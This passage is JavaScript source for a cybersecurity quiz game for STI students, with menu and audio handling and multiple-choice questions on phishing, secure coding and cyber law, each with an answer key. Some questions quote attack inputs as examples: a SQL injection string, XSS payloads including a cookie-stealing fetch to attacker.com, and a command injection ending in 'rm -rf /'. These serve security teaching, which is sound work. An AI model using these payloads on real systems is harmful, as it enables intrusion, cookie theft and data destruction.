const MENU_ACTIONS = ["campaign", "endless", "settings"];
const SELECTABLE_INDEXES = [0, 1, 2];

const campaignMenuOverlay = document.getElementById("campaign-menu-overlay");
const menuItems = Array.from(document.querySelectorAll(".menu-layout .menu-item"));
const difficultySelectionPanel = document.querySelector(".difficulty-selection-panel");
const difficultyItems = Array.from(document.querySelectorAll(".difficulty-item"));
const difficultyBackButton = document.getElementById("difficulty-back-button");

const settingsPanel = document.querySelector(".settings-panel");
const settingsBackButton = document.getElementById("settings-back-button");
const bgmVolumeSlider = document.getElementById("bgm-volume");
const sfxVolumeSlider = document.getElementById("sfx-volume");
const menuSfxVolumeSlider = document.getElementById("menu-sfx-volume");

let selectedMenuIndex = 0;
let isDifficultySelectionOpen = false;
let isSettingsOpen = false;
let selectedDifficultyIndex = 1;
let isMenuVisible = true;
let activeMode = "campaign";

const hoverSound = new Audio("assets/sounds/hover.mp3");
const clickSound = new Audio("assets/sounds/click.mp3");
const mainMenuMusic = new Audio("assets/sounds/main menu.mp3");
mainMenuMusic.loop = true;
const mainGameMusic = new Audio("assets/sounds/main game.mp3");
mainGameMusic.loop = true;

bgmVolumeSlider.addEventListener("input", (e) => {
    const vol = parseFloat(e.target.value);
    mainMenuMusic.volume = vol;
    mainGameMusic.volume = vol;
    if (typeof victoryMusic !== 'undefined') victoryMusic.volume = vol;
    if (typeof loseMusic !== 'undefined') loseMusic.volume = vol;
});

sfxVolumeSlider.addEventListener("input", (e) => {
    const vol = parseFloat(e.target.value);
    if (typeof punchSound !== 'undefined') punchSound.volume = vol;
    if (typeof kickSound !== 'undefined') kickSound.volume = vol;
});
sfxVolumeSlider.addEventListener("change", () => {
    if (typeof punchSound !== 'undefined') { punchSound.currentTime = 0; punchSound.play().catch(() => {}); }
});

menuSfxVolumeSlider.addEventListener("input", (e) => {
    const vol = parseFloat(e.target.value);
    hoverSound.volume = vol;
    clickSound.volume = vol;
});

function playMenuMoveSound() {
    hoverSound.currentTime = 0;
    hoverSound.play().catch(e => console.log("Audio play blocked:", e));
}

function playMenuSelectSound() {
    clickSound.currentTime = 0;
    clickSound.play().catch(e => console.log("Audio play blocked:", e));
}

function playMainMenuMusic() {
    if (isMenuVisible) {
        mainMenuMusic.play().catch(e => console.log("Audio play blocked:", e));
    }
}

function stopMainMenuMusic() {
    mainMenuMusic.pause();
    mainMenuMusic.currentTime = 0;
}

function stopMainGameMusic() {
    mainGameMusic.pause();
    mainGameMusic.currentTime = 0;
}

function playDisabledSound() {
    console.log("Disabled menu sound.");
}

function getItemByIndex(index) {
    return menuItems.find((item) => Number(item.dataset.index) === index);
}

function updateSelectedMenu(index, shouldPlaySound = false) {
    if (!SELECTABLE_INDEXES.includes(index)) {
        return;
    }

    selectedMenuIndex = index;
    menuItems.forEach((item) => {
        const isActive = Number(item.dataset.index) === selectedMenuIndex;
        item.classList.toggle("is-selected", isActive);
    });

    if (shouldPlaySound) {
        playMenuMoveSound();
    }
}

function moveSelection(direction) {
    const currentPosition = SELECTABLE_INDEXES.indexOf(selectedMenuIndex);
    const nextPosition = (currentPosition + direction + SELECTABLE_INDEXES.length) % SELECTABLE_INDEXES.length;
    updateSelectedMenu(SELECTABLE_INDEXES[nextPosition], true);
}

function shakeLockedItem() {
    const lockedItem = getItemByIndex(1);
    if (!lockedItem) {
        return;
    }

    lockedItem.classList.remove("is-shaking");
    void lockedItem.offsetWidth;
    lockedItem.classList.add("is-shaking");
}

function hideCampaignMenu() {
    isMenuVisible = false;
    campaignMenuOverlay.classList.add("hidden");
}

function activateMenuItem(index) {
    const action = MENU_ACTIONS[index];

    playMenuSelectSound();

    if (action === "endless") {
        startEndless();
        return;
    }

    if (action === "campaign") {
        openDifficultySelectionPanel();
        return;
    }

    if (action === "settings") {
        openSettingsPanel();
        return;
    }
}

function openSettingsPanel() {
    isSettingsOpen = true;
    settingsPanel.classList.remove("hidden");
    settingsPanel.setAttribute("aria-hidden", "false");
    bgmVolumeSlider.focus();
}

function closeSettingsPanel() {
    isSettingsOpen = false;
    settingsPanel.classList.add("hidden");
    settingsPanel.setAttribute("aria-hidden", "true");
    getItemByIndex(selectedMenuIndex)?.focus();
}

function openDifficultySelectionPanel() {
    isDifficultySelectionOpen = true;
    difficultySelectionPanel.classList.remove("hidden");
    difficultySelectionPanel.setAttribute("aria-hidden", "false");
    updateSelectedDifficulty(1);
}

function closeDifficultySelectionPanel() {
    isDifficultySelectionOpen = false;
    difficultySelectionPanel.classList.add("hidden");
    difficultySelectionPanel.setAttribute("aria-hidden", "true");
    getItemByIndex(selectedMenuIndex)?.focus();
}

function updateSelectedDifficulty(index, shouldPlaySound = false) {
    selectedDifficultyIndex = index;
    difficultyItems.forEach((item) => {
        const isActive = Number(item.dataset.difficulty) === selectedDifficultyIndex;
        item.classList.toggle("is-selected", isActive);
    });

    if (shouldPlaySound) {
        playMenuMoveSound();
    }
}

function activateDifficultyItem(index) {
    playMenuSelectSound();
    if (index === 1 || index === 2) {
        closeDifficultySelectionPanel();
        startCampaign(index);
    }
}

function handleMenuPointerEnter(event) {
    const item = event.currentTarget;
    const index = Number(item.dataset.index);

    if (!SELECTABLE_INDEXES.includes(index) || isDifficultySelectionOpen || isSettingsOpen || !isMenuVisible) {
        return;
    }

    if (selectedMenuIndex !== index) {
        updateSelectedMenu(index, true);
    } else {
        playMenuMoveSound();
    }
}

function handleMenuClick(event) {
    const item = event.currentTarget;
    const index = Number(item.dataset.index);

    if (!isMenuVisible || isDifficultySelectionOpen || isSettingsOpen) {
        return;
    }

    if (index !== 1) {
        updateSelectedMenu(index);
    }

    activateMenuItem(index);
}

function handleKeydown(event) {
    if (!overlay.classList.contains("hidden")) {
        const buttons = [restartButton, mainMenuButton];
        const activeIndex = buttons.indexOf(document.activeElement);

        if (["w", "W", "ArrowUp", "a", "A", "ArrowLeft"].includes(event.key)) {
            event.preventDefault();
            const nextIndex = activeIndex <= 0 ? 1 : 0;
            buttons[nextIndex].focus();
            return;
        }

        if (["s", "S", "ArrowDown", "d", "D", "ArrowRight"].includes(event.key)) {
            event.preventDefault();
            const nextIndex = activeIndex === -1 ? 0 : (activeIndex + 1) % buttons.length;
            buttons[nextIndex].focus();
            return;
        }
        
        return;
    }

    if (isDifficultySelectionOpen) {
        if (event.key === "Escape") {
            event.preventDefault();
            closeDifficultySelectionPanel();
            return;
        }

        if (["w", "W", "ArrowUp"].includes(event.key)) {
            event.preventDefault();
            if (document.activeElement === difficultyBackButton) {
                difficultyItems[1].focus();
            } else {
                const nextDifficulty = selectedDifficultyIndex === 1 ? 2 : 1;
                difficultyItems[nextDifficulty - 1].focus();
            }
            return;
        }

        if (["s", "S", "ArrowDown"].includes(event.key)) {
            event.preventDefault();
            if (selectedDifficultyIndex === 2 && document.activeElement !== difficultyBackButton) {
                difficultyBackButton.focus();
            } else if (document.activeElement === difficultyBackButton) {
                difficultyItems[0].focus();
            } else {
                const nextDifficulty = selectedDifficultyIndex === 1 ? 2 : 1;
                difficultyItems[nextDifficulty - 1].focus();
            }
            return;
        }

        if (event.key === "Enter" || event.key === " ") {
            if (document.activeElement === difficultyBackButton) return;
            event.preventDefault();
            activateDifficultyItem(selectedDifficultyIndex);
        }
        return;
    }

    if (isSettingsOpen) {
        if (event.key === "Escape") {
            event.preventDefault();
            closeSettingsPanel();
            return;
        }

        const focusables = [bgmVolumeSlider, sfxVolumeSlider, menuSfxVolumeSlider, settingsBackButton];
        const activeIndex = focusables.indexOf(document.activeElement);

        if (["w", "W", "ArrowUp"].includes(event.key)) {
            event.preventDefault();
            const nextIndex = activeIndex <= 0 ? focusables.length - 1 : activeIndex - 1;
            focusables[nextIndex].focus();
            return;
        }

        if (["s", "S", "ArrowDown"].includes(event.key)) {
            event.preventDefault();
            const nextIndex = activeIndex === -1 ? 0 : (activeIndex + 1) % focusables.length;
            focusables[nextIndex].focus();
            return;
        }

        if ((event.key === "Enter" || event.key === " ") && document.activeElement === settingsBackButton) {
            event.preventDefault();
            playMenuSelectSound();
            closeSettingsPanel();
        }
        return;
    }

    if (!isMenuVisible) {
        return;
    }

    if (["w", "W", "ArrowUp"].includes(event.key)) {
        event.preventDefault();
        moveSelection(-1);
        return;
    }

    if (["s", "S", "ArrowDown"].includes(event.key)) {
        event.preventDefault();
        moveSelection(1);
        return;
    }

    if (event.key === "Enter" || event.key === " ") {
        event.preventDefault();
        activateMenuItem(selectedMenuIndex);
    }
}

const gameDataIntermediate = [
    {
        question: "You receive a smishing (SMS phishing) message stating your GCash account has been temporarily blocked due to unusual activity. It provides a link to verify your identity. What is your first step?",
        answers: ["Click the link immediately to ensure your funds are safe.", "Reply to the message asking for proof of the unusual activity.", "Ignore the link and open the official GCash app independently to check your status.", "Forward the message to all your contacts to warn them."],
        correct: 2
    },
    {
        question: "A Teacher from the STI Faculty sends you a Facebook message asking for the MS Teams login credentials of your group so they can check your progress early. What should you do?",
        answers: ["Provide the credentials because they are an authority figure.", "Ask for their official STI email address and send the info there.", "Refuse and report the account, as official school business is not conducted via personal FB messages.", "Give a fake password to see if they are actually a teacher."],
        correct: 2
    },
    {
        question: "You are developing a web app for your capstone. You receive an email from a Security Researcher claiming they found a bug and attached a proof of concept ZIP file. How do you handle this?",
        answers: ["Open the ZIP file on your development machine to fix the bug.", "Upload the ZIP to a cloud drive first to scan it.", "Disregard the attachment and ask the researcher to provide a text-based explanation or screenshot.", "Delete the email and block the sender immediately without reading."],
        correct: 2
    },
    {
        question: "While researching for your ITMAWD project, a pop-up claims your Chrome browser is Out of Date and offers an .exe update. What is the safest action?",
        answers: ["Download the update to ensure your browser remains secure.", "Close the tab and check the About Chrome section in your actual browser settings.", "Restart your computer to clear the pop-up.", "Click Cancel on the pop-up, then click the X on the ad."],
        correct: 1
    },
    {
        question: "You receive an email from STI-Helpdesk (sender: support@sti-edu-ph.com) asking you to re-sync your Office 365 account. The link leads to a login page that looks identical to the STI portal. What do you check?",
        answers: ["Check if the logo on the page is high-resolution.", "Verify the URL (domain name) to see if it matches the official sti.edu domain.", "Enter a wrong password once to see if it accepts it.", "Trust it if the page has an HTTPS padlock icon."],
        correct: 1
    },
    {
        question: "A classmate shares a Premium Spotify APK in your Discord server. It asks for Overlay Permissions on your Android phone. Why is this a risk?",
        answers: ["It will drain your battery faster.", "It could be a Cloak and Dagger attack that captures your keystrokes over other apps.", "Overlay permissions are standard for all music apps.", "It will prevent you from receiving phone calls."],
        correct: 1
    },
    {
        question: "You are at a coffee shop near Muñoz-EDSA and see an open Wi-Fi named FREE_STI_STUDENT_WIFI. What is the risk of connecting?",
        answers: ["Your laptop might overheat from the high speed.", "A Man-in-the-Middle (MITM) attack could intercept your unencrypted data.", "The Wi-Fi signal will interfere with your mobile data.", "You will be charged a hidden fee on your tuition."],
        correct: 1
    },
    {
        question: "An old high school friend sends you a link on Messenger: Is this you in this video? with a laughing emoji. What is the most likely scenario?",
        answers: ["They found a funny video of you from a school event.", "Their account has been compromised by a session-hijacking script.", "It is a link to a surprise birthday greeting.", "Your Facebook privacy settings have been set to public."],
        correct: 1
    },
    {
        question: "Your development laptop suddenly displays a screen saying your files are encrypted and demands 0.05 BTC. This is a ransomware attack. What is your first action?",
        answers: ["Pay the ransom immediately to get your thesis files back.", "Disconnect the laptop from the internet and the local network.", "Try to rename the encrypted files to their original extensions.", "Shut down the laptop and leave it off for 24 hours."],
        correct: 1
    },
    {
        question: "You need a cracked version of Adobe Photoshop for a UI/UX project. You download a file, and your antivirus flags it as a Trojan. What should you do?",
        answers: ["Disable the antivirus just for the installation.", "Add the file to the Exclusions list.", "Delete the file immediately and look for an open-source alternative like GIMP.", "Run it inside a Guest account on Windows."],
        correct: 2
    },
    {
        question: "You find a USB drive in the STI computer lab. What is the safest way to find the owner?",
        answers: ["Plug it into an STI lab computer to see the files.", "Plug it into your own laptop to check the Properties.", "Hand it over to the Lab Supervisor or School Security without plugging it in.", "Upload the contents to a public Google Drive link to ask others."],
        correct: 2
    },
    {
        question: "Your Android phone is running very slow, and you see ads appearing on your home screen even when no apps are open. What is the likely cause?",
        answers: ["Your storage is 99% full.", "You accidentally installed Adware disguised as a utility app.", "Your phone processor is naturally wearing out.", "You need to update your Facebook app."],
        correct: 1
    },
    {
        question: "While installing a new IDE, the installer asks for Administrator Privileges. Is this normal?",
        answers: ["Yes, but only if you downloaded it from the official verified source.", "No, coding software never needs admin rights.", "Yes, it needs admin rights to delete your personal files.", "Only if you are using a Mac."],
        correct: 0
    },
    {
        question: "A Keylogger is a type of malware. If you suspect a computer has one, which action is most compromised?",
        answers: ["Watching a YouTube video.", "Typing your bank password on the keyboard.", "Moving your mouse across the screen.", "Printing a PDF document."],
        correct: 1
    },
    {
        question: "You are using a public computer at an Internet Cafe. How can you best protect your session from Session Hijacking?",
        answers: ["Use Incognito Mode and ensure you manually log out of all accounts.", "Just close the browser tab when finished.", "Delete the browser desktop shortcut.", "Change the desktop wallpaper before leaving."],
        correct: 0
    },
    {
        question: "Your group shared Google Drive folder has a file named thesis_final_v2.exe. The original file was a .docx. What happened?",
        answers: ["Google Drive converted it for better compatibility.", "A member of your group changed the extension to be funny.", "It is likely a Double Extension malware attack (e.g., file.docx.exe).", "The file was compressed to save space."],
        correct: 2
    },
    {
        question: "A friend asks to borrow your laptop to check their grades. They ask you to Auto-fill your password so they can see how the portal looks. What do you do?",
        answers: ["Let them; they are a trusted friend.", "Type it in but tell them to look away.", "Never share or auto-fill passwords for others; create a Guest profile for them instead.", "Use the Save Password feature so they can use it later."],
        correct: 2
    },
    {
        question: "You receive an MFA notification on your phone for your Microsoft account, but you aren't trying to log in. What does this mean?",
        answers: ["It’s a glitch in the app.", "Someone has your password and is trying to bypass the second layer.", "Your phone is being hacked via Bluetooth.", "You need to restart your phone."],
        correct: 1
    },
    {
        question: "You find a Sticky Note under a keyboard in the STI computer lab with a username and password written on it. What should you do?",
        answers: ["Log in to see whose account it is.", "Throw the note away to protect the person, then inform the lab admin.", "Post it on the school's Freedom Wall to find the owner.", "Keep it in case you forget your own password."],
        correct: 1
    },
    {
        question: "You notice an \"Active Session\" on your Facebook account from a location you’ve never been to. What is your response?",
        answers: ["Message the person at that location.", "Log out of all sessions and change your password immediately.", "Wait and see if any posts are made.", "Report the location to the police first."],
        correct: 1
    },
    {
        question: "While building an Android app, you want to request Location Permissions. When should the app ask for this?",
        answers: ["Immediately upon installation.", "Only when the user triggers a feature that requires the location.", "Every 5 minutes.", "Never; just take it secretly in the background."],
        correct: 1
    },
    {
        question: "Your groupmate wants to send you a file using an \"Open Share\" folder on the school network that anyone can access. What is a better alternative?",
        answers: ["Use the open folder; it's faster.", "Use a password-protected cloud link (like Google Drive or OneDrive) shared only with you.", "Post the file in a public Facebook group.", "Give them your laptop password so they can put it on your desktop."],
        correct: 1
    },
    {
        question: "You are using an API for your mobile app. You accidentally hard-coded the API Key in your public GitHub repository. What is the first step to fix this?",
        answers: ["Delete the repository.", "Delete the line of code and commit the change.", "Revoke/regenerate the API Key and use environment variables instead.", "Just make the repository private."],
        correct: 2
    },
    {
        question: "You see a 403 Forbidden error while trying to access a directory on your web server. What does this usually imply?",
        answers: ["The server is offline.", "The permissions are set correctly to prevent unauthorized directory browsing.", "Your internet is too slow.", "You have been banned from the internet."],
        correct: 1
    },
    {
        question: "You are using a third-party library for your Java project. You see a Vulnerability Warning on npm or Maven. What should you do?",
        answers: ["Ignore it if your code still runs.", "Update the library to the patched version immediately.", "Delete your entire project and start over.", "Write your own version of the entire library."],
        correct: 1
    },
    {
        question: "You are angry at a classmate and post their private home address and contact number on a public Facebook group. Under RA 10175, this could be considered:",
        answers: ["A harmless prank.", "Cyber-libel or a violation of the Data Privacy Act.", "Freedom of speech.", "Ethical hacking."],
        correct: 1
    },
    {
        question: "You notice a security flaw in the STI Student Portal that lets you see other students' grades. What is the most ethical action?",
        answers: ["Change your own grades to 100%.", "Download everyone's grades to prove the flaw exists.", "Report the flaw privately to the IT Department or School Administration (Responsible Disclosure).", "Post the flaw on TikTok to gain followers."],
        correct: 2
    },
    {
        question: "You create a Phishing Page just to test if your friends are smart enough to catch it. They enter their passwords. Even if you don't use them, is this illegal?",
        answers: ["No, because you are just a student.", "Yes, unauthorized access and computer-related fraud are illegal under RA 10175.", "Only if you steal money.", "Only if they report you to the police."],
        correct: 1
    },
    {
        question: "You are working as a freelance web developer. A client asks you to add a backdoor so they can spy on their employees. What is the ethical choice?",
        answers: ["Do it; the client is always right.", "Do it but charge double.", "Refuse, as it violates privacy ethics and could lead to legal trouble.", "Do it but tell the employees about it."],
        correct: 2
    },
    {
        question: "Someone is using your photo and name to create a fake account and scam people. This is called:",
        answers: ["Identity Theft / Computer-related Identity Theft.", "Digital Marketing.", "Profile Enhancement.", "Social Networking."],
        correct: 0
    },
    {
        question: "You receive a frantic Telegram call from your research group leader. The voice sounds exactly like them, claiming they are at a police station and need you to immediately transfer the source code of your project to a new external email to prove it’s a school project. What is your best course of action?",
        answers: ["Send the files immediately; the voice is unmistakable and urgency is high.", "Hang up and call your leader back on their known, saved phone number to verify the request.", "Ask the caller to state the group’s secret \"password\" to prove it’s them.", "Report the leader's Telegram account for hacking without responding."],
        correct: 1
    },
    {
        question: "You are working on your research paper at a fast-food chain near Muñoz Market. You notice the person at the next table is frequently glancing at your laptop screen while you type your STI Microsoft 365 credentials. What is the most effective way to handle this \"shoulder surfing\" risk?",
        answers: ["Stare back at them until they look away to establish dominance.", "Increase your screen brightness so the glare hides your text.", "Tilt your screen away, use a privacy filter if available, or wait to log in until you are in a more private area.", "Type your password very quickly so they cannot follow your finger movements."],
        correct: 2
    },
    {
        question: "You are about to post a \"study with me\" photo on Instagram to celebrate finishing Chapter 3. The photo shows your laptop, your STI ID card, and a blurred view of your current source code. Why is this a security risk?",
        answers: ["Your ID card contains a QR code or student number that can be used for identity spoofing.", "The music you use for your post might be copyrighted.", "Instagram's algorithm might flag the post as \"low quality\" due to the blur.", "Your followers might steal your research ideas."],
        correct: 0
    },
    {
        question: "Your phone is at 5% battery at the FPJ LRT Station. You see a free USB charging kiosk. You plug your phone in, and a prompt on your screen asks to \"Trust This Computer.\" What should you do to avoid \"Juice Jacking\"?",
        answers: ["Select \"Trust\" so your phone can negotiate a faster charging speed.", "Select \"Don't Trust\" and only use the port for power, or better, use a \"USB data blocker\" or your own wall outlet adapter.", "Turn off your phone completely before plugging it in to the USB port.", "Only plug it in for 5 minutes—not enough time for data to transfer."],
        correct: 1
    },
    {
        question: "You are restoring your research source code from a local backup after a malware scare. You notice that your backup drive was plugged in during the original infection. How do you proceed safely?",
        answers: ["Copy all files back to your laptop; backups are inherently safe.", "Run a deep scan on the backup drive using a different, clean machine before transferring any files.", "Format the backup drive immediately to be safe, even if it means losing the data.", "Only copy the .java files, as malware cannot hide in text-based code files."],
        correct: 1
    },
    {
        question: "While adding a new feature to your game, you find a helpful-looking library on a public forum called java-utils-sti-edition. It isn't on an official repository like Maven or GitHub. What is the primary risk of using it?",
        answers: ["The library might be outdated and not work with the latest Java version.", "It could be a \"Trojan\" containing a backdoor that activates once your game is compiled and shared.", "It might take up too much space on your laptop's SSD.", "The variable names in the library might not match your coding style."],
        correct: 1
    },
    {
        question: "You are building the login page for your ITMAWD capstone. You want to prevent a \"Brute Force\" attack where someone tries thousands of passwords per minute. Which logic should you implement?",
        answers: ["Make the password requirement at least 20 characters long.", "Implement a \"Rate Limiter\" or account lockout policy after five failed attempts.", "Hide the login page URL so only your group knows where it is.", "Use a colorful background to distract the automated bot."],
        correct: 1
    },
    {
        question: "You accidentally uploaded your project’s source code to a public GitHub repository with your personal database password hardcoded in the strings. You realize it 10 minutes later. What is the correct \"Incident Response\"?",
        answers: ["Delete the repository and pretend it never happened.", "Change the repository to \"Private\" so the history is hidden from the public.", "Change your actual database password immediately, then remove the secret from the code and use environment variables.", "Edit the file on GitHub and save it; the old password is gone once the new commit is made."],
        correct: 2
    },
    {
        question: "You find an unencrypted Excel file on an STI lab computer containing the contact details of Grade 12 students. You want to be a \"White Hat\" hacker. What is the most professional way to handle this?",
        answers: ["Delete the file so no one else can find it, then leave a note on the desktop.", "Copy the file to your USB to show the Dean as proof of the security flaw.", "Do not copy or move the file; immediately report the exact location of the data to the IT lab supervisor.", "Post a screenshot of the file (with names blurred) on a student forum to warn others."],
        correct: 2
    },
    {
        question: "You are using a \"Cracked\" IDE to code your Java projects because the professional version is too expensive. Why is this a major security risk for your projects?",
        answers: ["The IDE might not have the \"Auto-complete\" feature enabled.", "Cracked software often includes \"droppers\" that infect your machine with spyware to steal your project data.", "It is only illegal if you sell the game; for school research, it is technically safe.", "The cracked version will make your code run slower on other computers."],
        correct: 1
    }
];

const gameDataAdvanced = [
    {
        question: "You are developing a login system for a web app. During testing, you find that entering `' OR '1'='1` in the username field bypasses authentication. Which specific coding technique should you use to fix this?",
        answers: ["Implement a `while` loop to filter characters.", "Use Prepared Statements with Parameterized Queries.", "Increase the character limit of the input field.", "Use a JavaScript alert to warn the user about special characters."],
        correct: 1
    },
    {
        question: "Your Android application stores user API keys in a `strings.xml` file. A security audit identifies this as a high risk. How should you modify the app to protect these keys from being extracted via reverse engineering?",
        answers: ["Rename the file to `hidden.xml`.", "Use ProGuard to obfuscate the entire project.", "Store keys in the NDK (Native Development Kit) using C++ or use the Android Keystore system.", "Encrypt the XML file with a hardcoded password in the Java class."],
        correct: 2
    },
    {
        question: "A user reports that after clicking a link in an email, they were automatically logged out of your web app and their email address was changed without their consent. What security mechanism was missing?",
        answers: ["Secure Sockets Layer (SSL).", "Anti-CSRF (Cross-Site Request Forgery) Tokens.", "A stronger hashing algorithm for passwords.", "Two-factor authentication for login."],
        correct: 1
    },
    {
        question: "You are writing a Java method that handles file uploads. To prevent a \"Path Traversal\" attack, what logic must you implement before saving the file to the server?",
        answers: ["Check if the file size is less than 5MB.", "Sanitize the filename to remove `../` sequences and validate against a whitelist of allowed directories.", "Convert the file to a Base64 string before saving.", "Ensure the file extension is written in uppercase."],
        correct: 1
    },
    {
        question: "While building a profile page, you use `innerHTML` to display a user's biography. A malicious user sets their bio to `&lt;img src=x onerror=alert(1)&gt;`. How should you change your code to prevent this execution?",
        answers: ["Use `document.write()` instead.", "Use `textContent` or `innerText` to treat the input as literal text rather than HTML.", "Only allow users to type 50 characters.", "Change the background color of the bio section."],
        correct: 1
    },
    {
        question: "Your web application sends session cookies to the browser. You want to ensure these cookies cannot be accessed by client-side scripts to prevent session hijacking. Which attribute must you add to the cookie header?",
        answers: ["`Secure`", "`SameSite=Lax`", "`HttpOnly`", "`Max-Age=3600`"],
        correct: 2
    },
    {
        question: "A mobile app you developed communicates with a backend server via `http://api.myservice.com`. A \"Man-in-the-Middle\" (MitM) attack is detected. What is the most effective way to secure this communication?",
        answers: ["Change the port from 80 to 8080.", "Enforce HTTPS and implement SSL Pinning within the mobile app code.", "Compress the data into a ZIP file before sending.", "Use a private IP address for the server."],
        correct: 1
    },
    {
        question: "You are implementing a password reset feature. Which method of generating a reset token is most secure against \"Brute Force\" or \"Prediction\" attacks?",
        answers: ["Using `Math.random()` in JavaScript.", "Using the user's birthday and username combined.", "Using a cryptographically secure library like `java.security.SecureRandom`.", "Incrementing a global ID variable by 1 for each new token."],
        correct: 2
    },
    {
        question: "A search results page displays the query back to the user: \"Results for: [user_query]\". If a user enters `&lt;script&gt;fetch('https://attacker.com/steal?cookie=' + document.cookie)&lt;/script&gt;`, the cookie is stolen. How should you encode the output?",
        answers: ["Convert the string to Hexadecimal.", "Use HTML Entity Encoding (e.g., change `&lt;` to `&lt;`).", "Wrap the output in a `&lt;div&gt;` tag.", "Encrypt the search query before displaying it."],
        correct: 1
    },
    {
        question: "Your Java application connects to a MySQL database. You currently have the database password written directly in the source code. What is the best practice for securing this credential?",
        answers: ["Comments out the password before compiling.", "Move the password to an environment variable or a protected configuration file not included in version control.", "Write the password in a different font style in the IDE.", "Use a very long password that is hard to type."],
        correct: 1
    },
    {
        question: "You find a logic error where a user can change the price of an item in an e-commerce app by editing the HTML \"value\" attribute of a hidden input field before submitting the form. Where should the final price validation occur?",
        answers: ["In a JavaScript function triggered by the \"Submit\" button.", "Only on the client-side using CSS validators.", "Strictly on the server-side, fetching the price from the database based on the Product ID.", "By sending an email to the admin for every click."],
        correct: 2
    },
    {
        question: "To protect user passwords in your database, you decide to use MD5 hashing. A colleague says this is insecure. Which method should you implement instead to prevent \"Rainbow Table\" attacks?",
        answers: ["MD5 with a 4-digit PIN.", "Argon2 or BCrypt with a unique \"salt\" for every user.", "Storing passwords as Base64 encoded strings.", "Triple DES encryption."],
        correct: 1
    },
    {
        question: "You are coding a login form for a web project. How should you store passwords in your database?",
        answers: ["In Plaintext so you can recover them for users.", "Using Base64 encoding.", "Hashed using a strong algorithm like Argon2 or bcrypt.", "Encrypted with a password that is also stored in the database."],
        correct: 2
    },
    {
        question: "While reviewing code, you see: `Runtime.getRuntime().exec(\"ping \" + userInput);`. A user enters `127.0.0.1; rm -rf /`. What is this vulnerability called?",
        answers: ["Logic Bomb.", "Command Injection.", "Buffer Overflow.", "Directory Indexing."],
        correct: 1
    },
    {
        question: "You are building an API that returns user data. An attacker changes the URL from `api/users/105` to `api/users/106` and views another person's private profile. Which security control is failing?",
        answers: ["Input Validation.", "Insecure Direct Object Reference (IDOR) / Broken Object Level Authorization.", "Rate Limiting.", "Content Security Policy (CSP)."],
        correct: 1
    },
    {
        question: "To prevent automated \"Bot\" attacks from guessing passwords on your login page, which technical control should you implement?",
        answers: ["Change the background color after 3 failed attempts.", "Implement account lockout or \"Exponential Backoff\" (increasing wait times) and CAPTCHA.", "Ask the user to re-type their username.", "Use a larger font for the login button."],
        correct: 1
    },
    {
        question: "Your website uses many third-party JavaScript libraries via CDN. If one of those CDNs is hacked, the attacker could inject malicious code into your site. Which HTML attribute prevents this by verifying the file's hash?",
        answers: ["`crossorigin=\"anonymous\"`", "`integrity=\"sha384-...\"`", "`rel=\"stylesheet\"`", "`type=\"text/javascript\"`"],
        correct: 1
    },
    {
        question: "A Java program uses a fixed-size array to store user input. If the input is longer than the array, the program crashes or allows memory overwriting. How do you prevent this \"Buffer Overflow\" logic?",
        answers: ["Use a `try-catch` block for every line.", "Use dynamic data structures like `ArrayList` and perform explicit bounds checking.", "Tell the user not to type too much.", "Restart the computer if the program crashes."],
        correct: 1
    },
    {
        question: "You want to implement Multi-Factor Authentication (MFA). Which approach is considered more secure than SMS-based codes?",
        answers: ["Asking for the user's middle name.", "Using Time-based One-Time Passwords (TOTP) via an app like Google Authenticator.", "Sending the code to the user's secondary email.", "Using a secret question about their first pet."],
        correct: 1
    },
    {
        question: "A \"Zero-Day\" vulnerability is discovered in the version of Java your server uses. What is your immediate priority?",
        answers: ["Change all user passwords.", "Apply the security patch released by the vendor (Oracle) immediately.", "Rewrite the entire application in a different language.", "Ignore it until a user reports a problem."],
        correct: 1
    },
    {
        question: "Your server is being overwhelmed by thousands of requests per second from different IP addresses, making the site unavailable. What is the best technical solution to mitigate this DDoS attack?",
        answers: ["Buy more RAM for the server.", "Use a Web Application Firewall (WAF) and a Content Delivery Network (CDN) with DDoS protection (like Cloudflare).", "Delete the \"index.html\" file temporarily.", "Change the website's domain name."],
        correct: 1
    },
    {
        question: "You are configuring a `Content-Security-Policy` (CSP) header. Which directive would you use to tell the browser to only execute scripts from your own domain?",
        answers: ["`script-src 'self';`", "`default-src *;`", "`img-src 'none';`", "`allow-scripts: true;`"],
        correct: 0
    },
    {
        question: "A database administrator forgets to change the default password (`admin/admin`) for the database management tool. This is an example of:",
        answers: ["Social Engineering.", "Security Misconfiguration.", "Distributed Denial of Service.", "Cryptographic Failure."],
        correct: 1
    },
    {
        question: "You are developing a mobile app that handles sensitive medical data. The \"Data at Rest\" must be secured. Which method should you use?",
        answers: ["Hiding the file in a folder named \"System\".", "AES-256 encryption with keys managed in the Android Keystore.", "Saving the data as a `.txt` file so it is easy to read.", "No action is needed because mobile phones are always locked."],
        correct: 1
    },
    {
        question: "An attacker uses a \"Credential Stuffing\" attack against your app. They use a list of leaked passwords from a different website to log into your users' accounts. What should you implement to stop this specific automated behavior?",
        answers: ["Change the \"Login\" button to \"Sign In\".", "Implement Rate Limiting and check for \"Leaked Password\" databases during login.", "Use a different color for the password field.", "Force all users to change their username."],
        correct: 1
    },
    {
        question: "You notice that your web server is displaying the version number and operating system (e.g., \"Apache 2.4.41 (Ubuntu)\") on error pages. Why is this a risk?",
        answers: ["It makes the page look unprofessional.", "It provides \"Banner Grabbing\" info that helps attackers find specific exploits for that version.", "It uses too much bandwidth.", "It violates copyright laws."],
        correct: 1
    },
    {
        question: "A developer leaves a \"Backdoor\" in the code—a secret hardcoded account—to help them debug the live system later. Why is this a critical security flaw?",
        answers: ["It takes up too much memory.", "If discovered by an attacker, it gives full access to the system, bypassing all security.", "It slows down the login process.", "It makes the code harder to read."],
        correct: 1
    },
    {
        question: "You are setting up a firewall for your web server. Which \"Inbound\" port must remain open for users to access your website via HTTPS?",
        answers: ["21 (FTP)", "443 (HTTPS)", "3306 (MySQL)", "22 (SSH)"],
        correct: 1
    },
    {
        question: "Your client asks to implement a \"Remember Me\" feature, where should the persistent login token be stored on the client side most securely?",
        answers: ["In a `localStorage` item.", "In an `HttpOnly` and `Secure` cookie.", "In a global JavaScript variable.", "In the browser's history."],
        correct: 1
    },
    {
        question: "To prevent \"Clickjacking\" (where an attacker overlays an invisible iframe over your site), which HTTP header should you configure?",
        answers: ["`X-Frame-Options: DENY` or `SAMEORIGIN`", "`Cache-Control: no-cache`", "`Server: Private`", "`Connection: keep-alive`"],
        correct: 0
    },
    {
        question: "Your Java code uses a `try-catch` block that prints the full Stack Trace to the user's screen when an error occurs. Why is this dangerous?",
